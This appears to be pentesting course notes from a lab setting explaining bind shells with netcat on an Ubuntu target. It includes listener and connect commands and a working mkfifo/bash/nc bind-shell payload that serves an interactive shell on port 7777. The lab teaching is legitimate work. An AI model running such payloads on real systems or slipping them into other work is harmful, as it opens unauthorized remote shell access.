In many cases, we will be working to establish a shell on a system on a local or remote network. This is typically done by using a `Bind` &/or `Reverse` shell.

## What Is It?

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

We would connect directly with the `IP address` and `port` listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
## Practicing with GNU Netcat

In this scenario, we will be interacting with an Ubuntu Linux system to understand the nature of a bind shell. To do this, we will be using `netcat` (`nc`) on the client and server.

Once connected to the target box with ssh, start a Netcat listener:

#### No. 1: Server - Target starting Netcat listener
```
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```
#### No. 2: Client - Attack box connecting to target
```
tylapcheong@htb[/htb]$ nc -nv 10.129.41.200 7777
Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (`7777`). 
## Establishing a Basic Bind Shell with Netcat

Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.
#### No. 1: Server - Binding a Bash shell to the TCP session
```
`Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f`
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

#### No. 2: Client - Connecting to bind shell on target
```
tylapcheong@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$
```